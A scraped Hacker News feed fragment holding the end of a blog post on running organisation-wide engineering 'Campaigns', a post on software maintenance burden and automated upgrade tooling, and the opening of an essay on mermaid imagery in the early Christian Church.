<p>Metrics should be easy to grok and able to be sliced a few different ways. In our request threshold example, we might want to surface both “number of endpoints remaining” and “total percentage of endpoints.”</p>

<h2 id="buy-in">Buy-in</h2>

<p>A Campaign by definition reaches across the organization and touches many teams. Every team, mission, individual, and sub-org has different priorities and different worries.</p>

<p>For a Campaign to be successful, it needs global participation of those involved. Buy-in will look different in different organizations, but will generally be a mix of <a href="https://en.wikipedia.org/wiki/Carrot_and_stick">Carrot and Stick</a> (choosing to do something vs. being coerced to do something).</p>

<p>Leading with the benefits (i.e. the Carrot) can go a long way here:</p>

<ul>
  <li>“If we are able to make jobs idempotent, the Infrastructure team can take over responsibility of background jobs and reduce costs by 90%.”</li>
  <li>“If we are able to make all requests take less than 2 seconds, the customer experience will improve and we will be able to reduce costs.”</li>
</ul>

<p>The benefits may not be convincing enough or still might not meet the priority threshold for some teams. If many teams do not find the benefits convincing enough, you might not have a Campaign worth pursuing.</p>

<h2 id="a-method-of-holding-teams-accountable">A Method of Holding Teams Accountable</h2>

<p>How much further do we have to go? Where might we need to invest more?</p>

<p>Most Campaigns will have a central place to answer questions like these. Speadsheets here work just fine. Dashboards are even better. They might be automatically populated or populated by hand, usually with the help of a script. Whatever it is, it should quickly answer a few questions:</p>

<ul>
  <li>How far along are we?</li>
  <li>Which teams are doing well? (We should follow up with these teams to see what’s working for them.)</li>
  <li>Which teams are falling behind? (We should follow up with these team to see if they need more help, resources, etc.)</li>
</ul>

<p>This should be passively available, but also circulated on some regular cadence. Weekly, monthly, or quarterly, everyone involved should get an update in their inbox.</p>

<h2 id="a-window">A “Window”</h2>

<p>The Window is a method of prioritizing work to be done while ensuring that progress is permanent. It moves. It is optional but helpful in most Campaigns.</p>

<p>A Window usually defines two threshold: Warning and Not Allowed. In a Campaign to enforce a global request timeout, here’s how the Window might look at the start and evolve:</p>

<ol>
  <li>The Goal is to make no web request take longer than 5 seconds, 99.9% of the time.</li>
  <li>The Window is set to Warn: 30 seconds, Not Allowed: 60 seconds. 60 seconds is the current limit set by our load balancer and the behavior that exists today.</li>
  <li>Teams tackle all requests that fall between Warn and Not Allowed until there are no more in the Window.</li>
  <li>We move the Window down to Warn: 15 seconds, Not Allowed: 30 seconds.</li>
  <li>GOTO Step 3.</li>
</ol>

<figure>
  <img srcset="https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=100 100w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=200 200w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=300 300w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=320 320w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=400 400w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=500 500w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=600 600w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=640 640w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=700 700w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=750 750w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=768 768w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=800 800w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=900 900w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=1000 1000w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=1024 1024w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=1080 1080w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=1100 1100w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=1152 1152w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=1200 1200w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=1242 1242w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=1300 1300w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=1400 1400w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=1440 1440w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=1442 1442w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=1500 1500w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=1536 1536w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=1600 1600w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=1700 1700w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=1800 1800w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=1880 1880w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=1900 1900w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=1920 1920w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=2000 2000w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=2048 2048w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=2100 2100w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=2200 2200w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=2208 2208w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=2280 2280w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=2300 2300w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=2400 2400w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=2415 2415w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=2500 2500w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=2560 2560w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=2600 2600w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=2700 2700w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=2732 2732w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=2800 2800w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=2900 2900w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=3000 3000w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=3100 3100w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=3200 3200w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=3300 3300w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=3400 3400w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=3500 3500w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=3600 3600w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=3700 3700w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=3800 3800w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=3900 3900w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=4000 4000w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=4100 4100w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=4200 4200w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=4300 4300w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=4400 4400w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=4500 4500w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=4600 4600w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=4700 4700w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=4800 4800w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=4900 4900w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=5000 5000w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=5100 5100w, https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=5120 5120w" src="https://kellysutton-blog.imgix.net/images/campaign-windows.png?ixlib=jekyll-4.2.0&amp;w=5120" sizes="(min-width: 700px) 700px, 100vw">
</figure>

<p>Using this approach yields a few benefits:</p>

<ul>
  <li>Organizers of the campaign provide a default prioritization approach. Team do not have to develop their own.</li>
  <li>By setting and enforcing “Not Allowed,” we ensure that progress is permanent. A team cannot introduce a new request that takes longer than a given amount of time.</li>
  <li>Teams are warned in advance of a future change. They might receive a weekly email report, an exception, or a Slack message notifying them of something that is okay today but not okay in the future.</li>
  <li>Incremental value is delivered. If we stop the Campaign for whatever reason, lasting value will remain.</li>
</ul>

<h2 id="an-example-global-request-timeouts">An Example: Global Request Timeouts</h2>

<p>I’ve threaded an example throughout this post, but let’s look at a specific example compiled together.</p>

<p>One that I’ve seen in a few organizations is the need to set and/or reduce the total amount of time a web request can take. This is the type of thing that can be easy to ignore, especially in applications serving industries with high switching costs or a <a href="https://en.wikipedia.org/wiki/Principal%E2%80%93agent_problem">Principal-agent problem</a>. (High switching costs or principle-agent problem mean a slow degredation of performance will never bubble up as a priority.) Many Campaigns take the form of “If we knew to have this limit in the first place, this would be a lot easier.”</p>

<p>Let’s put it all together.</p>

<div>

<p><strong>Goal:</strong></p>

<p>We want to improve the customer experience and resiliency of our system by limiting the amount of time a request can take.</p>

<p>We want to eventually get to 2 seconds for the 99th percentile of requests, with a hard cutoff of 5 seconds.</p>

<p>We talk more about this Goal, why it was chosen, and it’s urgency in <em>this longer document</em>. (Link to something convincing.)</p>

<p><strong>Metrics:</strong></p>

<ul>
<li>Number of endpoints not adhering to the Goal.</li>
<li>Number of endpoints within the Window.</li>
</ul>

<p><strong>Window:</strong></p>

<p>At the start, we’ll set the Window to:</p>

<ul>
<li>Warn: 30 seconds.</li>
<li>Not Allowed: 60 seconds (this is the current timeout setting).</li>
</ul>

<p>From there, we’ll look to increment the Warn threshold by 15 seconds, or N/2 each time.</p>

<p><strong>Campaign Manager:</strong></p>

<p>Jane Smith will be in charge of tracking progress and reporting on this Campaign.</p>

<p>Jane and Team X will be available to help teams get their requests to the goal. Team X is also responsible for unowned code in the system.</p>

<p><strong>Target Date:</strong></p>

<p>We’d like to be complete with this effort on January 1, 2021.</p>

</div>

<h2 id="further-reading">Further Reading</h2>

<ul>
  <li><a href="https://lethain.com/migrations/">“Migrations: The sole scalable fix to tech debt,” Will Lethain.</a></li>
  <li><a href="https://en.wikipedia.org/wiki/Project_management">Project Management</a></li>
  <li><a href="https://en.wikipedia.org/wiki/OKR">Objectives and Key Results</a></li>
</ul>

<h2 id="conclusion">Conclusion</h2>

<p>This post is a generalization of an effort I find myself doing more and more at Gusto. Every campaign is a little bit different, and needs to be adapted accordingly.</p>

<p>Hopefully this framework helps you and your teams make complicated technical changes that require large-scale behavioral or process changes.</p>

<hr>

<p>Special thanks to <a href="https://www.linkedin.com/in/tonirib/">Toni Rib</a>, <a href="https://mxstbr.com/">Max Stoiber</a>, <a href="http://www.dannyzlobinsky.com/">Danny Zlobinsky</a>, <a href="https://www.estebanpastorino.com/">Kito Pastorino</a>, and <a href="https://www.shayon.dev/">Shayon Mukherjee</a> for reading early drafts of this post and providing feedback.</p>





  </article>

</div>

      </div>
    </div></div>]]>
            </description>
            <link>https://kellysutton.com/2021/01/06/campaigns.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25713656</guid>
            <pubDate>Sun, 10 Jan 2021 11:34:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Software Is Drowning the World]]>
            </title>
            <description>
<![CDATA[
Score 66 | Comments 60 (<a href="https://news.ycombinator.com/item?id=25713631">thread link</a>) | @kiyanwang
<br/>
January 10, 2021 | https://jamesabley.com/software-is-drowning-the-world/ | <a href="https://web.archive.org/web/*/https://jamesabley.com/software-is-drowning-the-world/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <div>

  

  <article>
    <p>One of the many upsides I’ve had from working at lots of organisations
is that you get to see what’s common. Are things like this everywhere?
Frequently, the answer is yes!</p>

<p>An example of this is tech debt.</p>

<p>I see organisations which are running to stand still, and I’m not
sure they realised they’re doing that.</p>

<p>What do I mean by this?</p>

<p>Every time you decide to solve a problem with code, you are committing
part of your future capacity to maintaining and operating that code.
Software is never done.</p>

<p>Here’s a few examples of demonstrating what I mean:</p>

<h2 id="security">Security</h2>

<ol>
  <li>You write a networked service to solve a business problem. Say
it has an HTML web UI</li>
  <li>It has no known security issues</li>
  <li>Time passes</li>
  <li>You now have security issues with your code, and you should assess
 whether you need to do work to address these.</li>
</ol>

<p>WAT?</p>

<p>Humans are terri-bad at writing secure code. And given enough time,
other humans will discover the security holes in your service.</p>

<p>This applies both to code your organisation writes, and the libraries
they use, or the operating systems, or web servers, or …</p>

<h3 id="security-examples">Security Examples</h3>

<p>Take your pick from browsing a CVE database, or use
<a href="https://snyk.io/">Snyk</a> or similar to look at your current codebases.</p>

<ul>
  <li>TLS / SSL issues:
    <ul>
      <li><a href="https://en.wikipedia.org/wiki/POODLE">POODLE</a></li>
      <li><a href="https://blog.zoller.lu/2011/09/beast-summary-tls-cbc-countermeasures.html">BEAST</a></li>
      <li><a href="https://en.wikipedia.org/wiki/CRIME">CRIME</a></li>
      <li><a href="https://en.wikipedia.org/wiki/BREACH">BREACH</a></li>
      <li><a href="https://en.wikipedia.org/wiki/Heartbleed">Heartbleed</a></li>
    </ul>
  </li>
  <li><a href="https://www.cvedetails.com/vulnerability-list.php?vendor_id=15183&amp;product_id=31286&amp;version_id=&amp;page=1&amp;hasexp=0&amp;opdos=0&amp;opec=0&amp;opov=0&amp;opcsrf=0&amp;opgpriv=0&amp;opsqli=0&amp;opxss=0&amp;opdirt=0&amp;opmemc=0&amp;ophttprs=0&amp;opbyp=0&amp;opfileinc=0&amp;opginf=0&amp;cvssscoremin=6&amp;cvssscoremax=0&amp;year=0&amp;month=0&amp;cweid=0&amp;order=1&amp;trc=20&amp;sha=97513f3fa07a803c5507b2cf550af9877acd90f2">Spring</a></li>
  <li><a href="https://www.cvedetails.com/vulnerability-list.php?vendor_id=45&amp;product_id=6117&amp;version_id=&amp;page=1&amp;hasexp=0&amp;opdos=0&amp;opec=0&amp;opov=0&amp;opcsrf=0&amp;opgpriv=0&amp;opsqli=0&amp;opxss=0&amp;opdirt=0&amp;opmemc=0&amp;ophttprs=0&amp;opbyp=0&amp;opfileinc=0&amp;opginf=0&amp;cvssscoremin=6&amp;cvssscoremax=0&amp;year=0&amp;month=0&amp;cweid=0&amp;order=1&amp;trc=70&amp;sha=5369e34293062ebe460c99e6878e0792ac23944c">Struts</a></li>
</ul>

<h3 id="legislation">Legislation</h3>

<ol>
  <li>You write a networked service to solve a business problem. Say
 it has an HTML web UI</li>
  <li>It has no known legal compliance issues</li>
  <li>Time passes</li>
  <li>You now have legal compliance issues with your code, and you should
 assess whether you need to do work to address these.</li>
</ol>

<p>WAT?</p>

<p>The <a href="https://en.wikipedia.org/wiki/General_Data_Protection_Regulation">General Data Protection Regulation</a>
addressed organisations not handling data very well.</p>

<p>Privacy and Electronic Communications Regulations – mostly known
for mandating cookie policy.</p>

<p>The Equality Act 2010 (UK) and the Americans with Disabilities Act
1990 (2010 update) for website accessibility. Yes, there was a time
when people didn’t consider accessibility when building web sites.</p>

<p>Brexit has meant a lot of changes for businesses in the EU and UK.
Software has been rewritten to manage the new trading relationships.
This will continue to happen for a while countries establish new
relationships.</p>

<h3 id="3rd-parties">3rd parties</h3>

<ol>
  <li>You write a service to solve a business problem</li>
  <li>You can build and release it when necessary</li>
  <li>Time passes</li>
  <li>You are now unable to build and release the service</li>
</ol>

<p>WAT?</p>

<p>3rd parties will change their APIs, or how things work. They may
do this for any number of reasons: performance, or security among
them. Older versions become deprecated, and unsupported. And these
older versions will still have new security issues reported against
them. So you need to upgrade, and adapt your code to use the new
API.</p>

<p>People building code libraries will strive to maintain backward
compatibility. But we still get <a href="https://semver.org/">semver</a> major
version changes, and breaking API changes.</p>

<h2 id="implications">Implications</h2>

<p>Most software needs constant maintenance. Building and operating
software has a cost which you should always factor in when deciding
to solve problems in that way.</p>

<p>A team working in a particular way can only be responsible for a
fixed amount of software. The amount of software should be managed,
otherwise the team will grind to a halt.</p>

<h2 id="proposition">Proposition</h2>

<blockquote>
  <p>A team working in a particular way</p>
</blockquote>

<p>What if we change how they work?</p>

<p>Well yes, there are options there.</p>

<p>I’ve got a separate post (currently brewing) about Dunbar’s numbers,
but for this post, different sized organisations might have different
options. At a certain size, it makes sense to have people dedicated
to developer productivity and creating tools which improve the
capacity of other teams.</p>

<p>You can choose higher-level languages, and use technology stacks
from SaaS vendors which need less time from your people.</p>

<p>There is one option I had planned to spend researching last year
(but I ended up getting a job instead). This feels like potentially
a big market. I’ve seen lots of organisations with decade-old
codebases which are still running unsupported versions of dependencies
or frameworks.</p>

<p>As a developer, I’m familiar with a hammer, and was curious if I
could use it.</p>

<p>Can we have tooling that automates keeping software up-to-date?</p>

<p>I see this problem in every organisation I’ve ever worked in, with
all aspects.</p>

<p>Web applications/APIs written in any language. As mentioned above,
there are many reasons that software rots if left unattended. Mobile
apps also have this. Migrating versions of Android, or iOS, or …</p>

<p>Configuration/manifests for Infrastructure as Code aslo suffer from
this. Terraform hasn’t yet released 1.x, but there have been many
changes over the years. If you’re using Cloud Foundry or Kubernetes,
you’ll <a href="https://github.com/doitintl/kube-no-trouble">have experienced
changes</a> which mean
you need to do work.</p>

<p>Automating the changes needed in YAML for upgrading from Kubernetes
<code>n</code> to <code>n+1</code> feels like a widely useful tool.</p>

<h2 id="current-state">Current State</h2>

<p>There are some commercial things which do related work.</p>

<p>Snyk, <a href="https://github.com/renovatebot/renovate">Renovate</a>,
<a href="https://dependabot.com/">Dependabot</a> and other things exist which
can make pull requests to update dependencies. Mpost languages have
a package tool and bumping numbers is pretty straightforward. These
things tend to not be able to manage breaking API changes though.
Bumping a patch or minor dependency upgrade is fine, but a major
one with breaking API changes tends to need a human to get involved.</p>

<p>Why? Could we have a tool that solves this? When a new version of
<a href="https://spring.io/">Spring</a> is released, could it include an
accompanying set of transformations which will allow the entire
ecosystem to safely and rapidly upgrade?</p>

<p>Having a minor interest in compilers (and having worked on a
commercial interpreter), I tend to think of code editing operations
as transformations, rather than characters. There’s been <a href="https://www.facebook.com/notes/kent-beck/prune-a-code-editor-that-is-not-a-text-editor/1012061842160013">some
research in transformation-based
editors</a>,
but I’ve not seen a lot else.</p>

<p>Major version upgrades could potentially be similarly expressed in
terms of transformations, which similarly might be composed. So if
a class has been removed between major versions of a dependency,
the required transformation might be composed of:</p>

<ol>
  <li>Insert new class <code>my.Y</code></li>
  <li>Implement interface <code>spring.new.Z</code></li>
  <li>Adapt method <code>A</code> from old class <code>my.Z</code> onto method <code>B</code> in new
 class <code>my.Y</code></li>
  <li>Adapt parameters from adapted method – a <code>Context</code>
 used to be obtained from <code>ApplicationSingleton</code> but is now passed
 in explicity</li>
  <li>etc</li>
</ol>

<p>And then you would need a serialisation format and publishing
mechanism for these sets of transformations.</p>

<p>The closest I’ve seen to this is where Google actually did that in
the same target langauge. They <a href="https://blog.golang.org/introducing-gofix">published a tool with for the
language Go</a>, named
<a href="https://golang.org/cmd/fix/"><code>fix</code></a>. It automated upgrades of
existing code before 1.x was released, and since then, they’ve had
<a href="https://golang.org/doc/go1compat">the Go 1 compatibility document</a>.</p>

<p>Sadly, <code>fix</code> appears to have been mostly inactive since then?</p>

<p>I’m interested (academically as well as commercially) in producing
a tool which looked something similar, but much more widely applicable.</p>

<p>So having something that can take code/configuration, generate an
Abstract Syntax Tree (AST), and then apply a set of transformations.
Transformations compose. A large one might be <strong>Upgrade Framework
<code>n</code> to <code>n+1</code></strong> involvings lots of smaller transformations. For each
transformation, you’d need to query the AST for usages of the old
API, then try to apply the transformation which maps the old API
to the new API.</p>

<p>I’ve found <a href="https://dl.acm.org/doi/10.1145/1103845.1094832">one related paper</a>.
Given that it’s not gone further, was it too hard, or not viable, or
the wrong time?</p>

<h2 id="summary">Summary</h2>

<p>So I think this would be the next evolution in automated upgrades.
It’s seems like a big market – how many companies would pay for you
to solve this problem for them and allow them to concentrate on
business logic rather than plumbing concerns?</p>

<p>But I didn’t take the time off I planned to confirm the potential
market and see how hard a problem it would be solve :)</p>

<h2 id="further-reading">Further Reading</h2>

<p><strong>Update</strong> I originally published this without a list of references.
I should have done the hard work to include them. Mostly that meant
mining my browser history and Pinboard from February and March 2019
when I spent a chunk of time first looking at this
<strong>for absolutely no reason at all, clients of the time</strong>.</p>

<ul>
  <li><a href="https://dl.acm.org/doi/10.1145/1103845.1094832">Refactoring support for class library migration</a></li>
  <li><a href="https://ercim-news.ercim.eu/en88/special/automatic-upgrade-of-java-libraries">Automatic Upgrade of Java Libraries</a>
which linked to <a href="http://web.archive.org/web/20170409031849/http://kenai.com/projects/refactoringng">a defunct Netbeans plugin</a></li>
  <li><a href="http://autorefactor.org/">Autorefactor</a></li>
  <li><a href="http://walkmod.com/">Walkmod</a></li>
  <li><a href="https://github.com/Netflix-Skunkworks/rewrite">Rewrite</a>
    <ul>
      <li>This has now become <a href="https://docs.openrewrite.org/">OpenRewrite</a>
and might be what I’m after, for Java and YAML at least. There is
an example which (when complete) is supposed to migrate from
Spring Boot 1.5.x to Spring Boot 2.x.</li>
    </ul>
  </li>
</ul>

  </article>

</div>

      </div>
    </div></div>]]>
            </description>
            <link>https://jamesabley.com/software-is-drowning-the-world/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25713631</guid>
            <pubDate>Sun, 10 Jan 2021 11:31:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Merpeople Say About Us]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25713617">thread link</a>) | @dnetesn
<br/>
January 10, 2021 | http://oceans.nautil.us/feature/660/what-merpeople-say-about-us | <a href="https://web.archive.org/web/*/http://oceans.nautil.us/feature/660/what-merpeople-say-about-us">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p><span>M</span>erpeopleâ€™s hybridity has helped them maintain a presence in both scientific and mythological camps. In many peopleâ€™s minds, mermaids and mermen remain mythical creatures more suitable for bedtime stories than scientific tracts. Yet for others merpeople symbolize the outer limits of our scientific and mythological investigations.&nbsp;</p>

<p>Just as the evolution of science has not done away with lingering notions of wonder and myth, so too has our innate need to push boundaries of knowledge led humanity into strange—often mind-blowing—frontiers of research and self-reflection. Humanityâ€™s interaction with merpeople demonstrates our ongoing need for discovery as much as our attempts at regulation and classification. Like the hybrid monstrosities with which humankind has always grappled, humanity maintains a tenuous balance between wonder and order, civilization and savagery.&nbsp;<br></p>
<p>Perhaps nowhere is this fragile equilibrium more obvious than in the early Christian Churchâ€™s myriad representations of mermaids and tritons. Murky ideologies of mermaids and mermen originated in ancient gods and goddesses of the sea; although mermaids now rule as the more popular of the two, merpeopleâ€™s predominance began with mermen. The Babylonians had their fish-god Oannes dating back to 5,000 BCE, while the Philistines, Assyrians and Israelites created the â€˜female prototypeâ€™ for the mermaid with Atargatis, a fertility goddess who was the female counterpart to Oannes. Importantly, Atargatis also symbolized the danger of love and lust, an association which Christians would later embrace wholeheartedly.</p>
<p>A spate of pagan representations of merpeople followed Oannes and Atargatis, ranging from Greek and Roman depictions of Aphrodite and Venus, respectively, to Pliny the Elderâ€™s descriptions of mysterious human-fish sea creatures in 80 CE, to the Greeksâ€™ incorporation of Triton (the origin for the merman) and his wife Amphitrite, to Odysseusâ€™ fateful encounter with the harpies (airborne daughters of sea-goddesses) on his famous voyage. Oddly, harpies and the Greek â€˜Scyllaâ€™—hybrid monstrosities with little resemblance to half-fish, half-women mermaids—would ultimately spawn modern interpretations of mermaids. Over time, artists and writers took the helm in transforming the monstrous representations of Scylla and Homerâ€™s harpies into our modern interpretations of mermaids, replete with sexual overtones, siren songs and the overtly feminine (often naked) form. Thus, while mermen found their origins in a Greek god, mermaids largely originated from hideous beasts who only intended to bring man to destruction through his own lust for sex and power. As would be demonstrated by the early Christian Church, such connotations of sex, lust and power were no coincidence.</p>
<figure><img src="https://s3.amazonaws.com/nautilus-vertical/oceans_1dc26359e27a167f1bd1825f1abacd2e.jpg" alt="Screen Shot 2021-01-07 at 2.19.08 AM"><figcaption><span>â€˜Derceto [or Atargatis] Dominating the Seaâ€™, from Athanasius Kircher, Oedipus Aegyptiacus (1652). </span></figcaption></figure>
<p>Beginning in the third to fifth centuries CE, Church leaders simultaneously adopted, transformed and harnessed ancient pagan symbols of merpeople to assert notions of piety, faith and self- control. Although mermen had long been associated with rape and violence, the early Christian Church was on a mission to dethrone femininity, and had little use for these male monstrosities. Rather, churchmen hoped to transform notions of the Homerian harpy to fit their own means, and in doing so adopted more sexual connotations and imagery in their representations of mermaids.<br></p>
<p>Physical representations of merpeople were critical to this process. Our modern conception of the mermaid stems directly from early churchmenâ€™s depictions of these mysterious creatures. Traditionally shown as human females above the waist, with long, flowing hair and bare breasts, a mirror in one hand and a comb in the other, these half-women, half-fish served as ideal symbols of wonder and danger for Church leaders. Beyond utilizing such â€˜monstersâ€™ to demonstrate Godâ€™s ability to â€˜alter his own laws of natureâ€™, churchmen especially adopted these pagan creatures in an effort to depreciate the feminine—hence the overtly sexual representation of mermaids in church carvings, bestiaries, illuminated texts and artwork. Nakedness—especially as a vehicle for sexual lust—was rare in early Christian and medieval art. Thus, as topless women (who also boasted scaly fish-tails), mermaids would have harnessed a shock factor through image alone.</p>
<blockquote>Church leaders simultaneously adopted, transformed and harnessed ancient pagan symbols of merpeople.</blockquote>

<p>Oftentimes, in fact, church sculptors portrayed mermaids â€˜spreadingâ€™ their tails apart, thereby exposing their reproductive area—or <em>vesica piscis</em> (Latin for â€˜vessel of the fishâ€™)—in graphic detail. A mermaidâ€™s accessories also revealed deeper symbolism, with her mirror and comb representing vanity (not to mention the duality of oneâ€™s soul outside the body) and her flowing hair signifying fertility. Sometimes, mermaids would hold a fish instead of a comb, which probably further symbolized her link to the fish as an early symbol of Christianity. By the medieval period (the fifth to fifteenth centuries CE), churchgoers throughout Europe worshipped in spaces decorated with overtly sexualized mermaid imagery. Church leaders, meanwhile, cultivated an intimate knowledge of these strange creatures through myriad texts, art and sculpture. Such ubiquity helped to facilitate general acceptance of, and belief in, mermaids.&nbsp;</p>
<p>In symbolism used by the early Christian Church, mermen were not as popular as mermaids. When mermen occasionally appeared in church carvings, they were almost always paired with mermaids. This representation correlated with early Christian and medieval imagery—especially cultivated in illuminated texts and bestiaries—which generally depicted mermen as partners of mermaids. Mermaids were much more likely to appear alone than were mermen. In contrast to the beautiful (and dangerous) female form of the mermaid, moreover, authors and illustrators represented mermen either as ugly creatures intended to oppose the mermaidâ€™s striking femininity and sexuality, or as symbolic of Christian piety.&nbsp;</p>

<figure><img src="https://s3.amazonaws.com/nautilus-vertical/oceans_048a295d789994cc78e70cb5e3516b0a.jpg" alt="Screen Shot 2021-01-07 at 2.21.52 AM"><figcaption><span>Mermaid in the Luttrell Psalter (1325â€“40). </span></figcaption></figure>
